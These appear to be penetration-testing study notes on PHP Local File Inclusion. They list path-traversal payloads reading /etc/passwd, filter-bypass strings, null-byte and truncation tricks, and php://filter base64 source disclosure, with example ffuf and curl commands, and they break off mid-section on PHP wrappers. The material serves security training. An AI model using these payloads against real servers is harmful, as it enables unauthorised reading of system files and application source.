# Local File Inclusion (LFI)

LFI occurs when user input is used in a file include function, allowing reading of local files from the server.

**Basic Example**

A vulnerable parameter:

`http://<SERVER_IP>:<PORT>/index.php?language=es.php`

If the parameter is passed directly:

`include($_GET['language']);`

We can change it to:

`?language=/etc/passwd`       # Linux
`?language=C:\Windows\boot.ini`  # Windows


**Path Traversal**

If input is appended to a directory:

`include("./languages/" . $_GET['language']);`

Use `../` to move up directories:

`?language=../../../../etc/passwd`

Even excessive `../` won’t break the path.

**Filename Prefix Bypass**

If input has a prefix:

`include("lang_" . $_GET['language']);`

Try adding / before traversal:

`?language=/../../../etc/passwd`

(May not work if the prefixed directory doesn’t exist.)


**Appended Extensions**

If `.php` is appended automatically:

`include($_GET['language'] . ".php");`

`?language=/etc/passwd` becomes `/etc/passwd.php` (nonexistent).
Bypasses may involve `wrappers/filters` (covered later).

**Second-Order LFI**

LFI can occur indirectly when another function uses user-controlled data stored elsewhere (e.g., database).

Example:

`/profile/$username/avatar.png`

If username is `../../../etc/passwd`, the avatar loader may include the target file instead.


# Basic LFI Bypasses

Techniques to bypass common LFI protections.

**1. Non-Recursive Path Traversal Filters**

Example filter:

`$language = str_replace('../', '', $_GET['language']);`

Bypass using:

<pre>?language=....//....//....//....//etc/passwd
?language=..././..././..././..././etc/passwd
?language=....\/\/....\/\/etc/passwd</pre>

**2. Encoding**

`Encode ../ → %2e%2e%2f`

Example:

`?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`

You can double-encode for stricter filters.

**3. Approved Paths**

Filter:

<pre>if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}</pre>

Bypass:

`?language=./languages/../../../../etc/passwd`

**4. Appended Extensions**

If `.php` is appended:

`include($_GET['language'] . ".php");`

Bypass only possible on older PHP versions (see below).

**5. Path Truncation (PHP < 5.3/5.4)**

Use long string (>4096 chars) to truncate `.php`:

`echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`

**6. Null Bytes (PHP < 5.5)**

Terminate string before .php:

`?language=/etc/passwd%00`


# PHP Filters

Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.

PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE.

**Input Filters**

PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.
To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with:

`php://filter/`

The filter wrapper has several parameters, but the main ones we require for our attack are:

- resource → the stream we want to apply the filter to (e.g., a local file)
- read → the type of filter to apply (e.g., base64 encode)

The filter useful for LFI attacks is:

`convert.base64-encode`

**Fuzzing for PHP Files**

Example fuzzing command:

`ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`

Example output:

<pre>index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]</pre>

Tip: When fuzzing for LFI, scan for all response codes (200, 301, 302, 403) — you may still be able to include those files.

**Standard PHP Inclusion**

Example request:

`http://<SERVER_IP>:<PORT>/index.php?language=config`

In many cases, this will execute the PHP file and render HTML output, meaning you won’t see the raw PHP source.

**Source Code Disclosure with PHP Filters**

We can use the base64 filter to read the raw PHP source code:

`php://filter/read=convert.base64-encode/resource=config`

Example LFI request:

`http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config`

Example decoding on attacker machine:

`echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d`

Decoded snippet:

<pre>if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}</pre>

# PHP Wrappers

Use PHP Wrappers with LFI to read files or run commands.  
We’ll cover 3 main ones: **data**, **input**, and **expect**.

---

## 1. Data Wrapper
Needs `allow_url_include = On` in PHP config.  
Check with LFI + base64 filter:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
